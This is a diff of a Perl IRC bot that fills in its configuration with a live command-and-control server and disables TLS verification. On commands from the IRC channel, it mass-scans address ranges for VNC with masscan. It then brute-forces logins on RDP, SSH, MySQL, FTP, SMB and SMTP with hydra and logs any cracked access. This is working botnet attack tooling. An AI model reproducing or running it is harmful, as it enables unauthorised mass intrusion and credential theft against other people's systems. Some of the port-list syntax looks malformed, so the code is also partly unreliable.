@@ -6,19 +6,19 @@ use feature 'say';
 use Fcntl qw(:flock SEEK_END);
 my $filename = 'CCFinder.log';
 $|=1;
-#defineportshere
-my @hydra_PORTS = qw/\'3389 22 3306 21 445 139 25\';
+my @VNC_PORTS = qw/'5900 5901'/;
+my @hydra_PORTS = qw/'3389 22 3306 21 445 139 25/';
 use Mojo::IOLoop;
-#definetimeouthere
-#defineforkshere
-#definenoticechanhere
-#definechanhere
+my $forktimeout = 12;
+my $maxforks = 1234;
+my $noticechan = '@#x';
+my $channel = '#x';
 my $irc = Mojo::IRC->new(
- #definenickhere
+ nick => 'X'.int(rand(99999)),
  user => 'VNCScan',
- #defineserverhere
+ server => 'irc-4.iownyour.biz:6697',
  );
-#definesslhere
+$irc->tls({insecure => 1});
 $irc->on(irc_rpl_welcome => sub {
  my($irc, $err) = @_;
  warn 'Joined IRC server.';
@@ -73,7 +73,7 @@ $irc->on(irc_privmsg => sub {
     if ($msg =~ /@.scan ([^\s]+)/) {
      $s->progress("[Info] Starting masscan... [VNC Scan in progress ...]");
      my $range = $1;
-     my $masscancmd = "masscan -p 5900 --range $range --rate 25000 --open --banners -oG hosts.txt ";
+     my $masscancmd = "masscan -p 5900 --range $range --rate 30000 --open --banners -oG hosts.txt ";
      warn "Received rangescan request on $range , running masscan...";
      my $r = `$masscancmd`;
      push @IRC_RESULTS, $_ foreach split "\n", $r;
@@ -129,7 +129,7 @@ $irc->on(irc_privmsg => sub {
     foreach my $porti (@hydra_PORTS)
     {
       if (my $sock = IO::Socket::INET->new(PeerAddr => $host, PeerPort => $porti->[0], Proto => 'tcp')) {
-        printa("[Cracking " . $porti->[1] . "] $host");
+        printa("[Cracking " . $porti->[1] . "] $host");
         my @cmdhydra = ("sudo hydra -F -L /user -P /pass $host " . lc($porti->[1]) . " -s " . $porti->[0] . " -v -t 4 -W3 >>xploits.log");     
         close($sock);
         system(@cmdhydra);
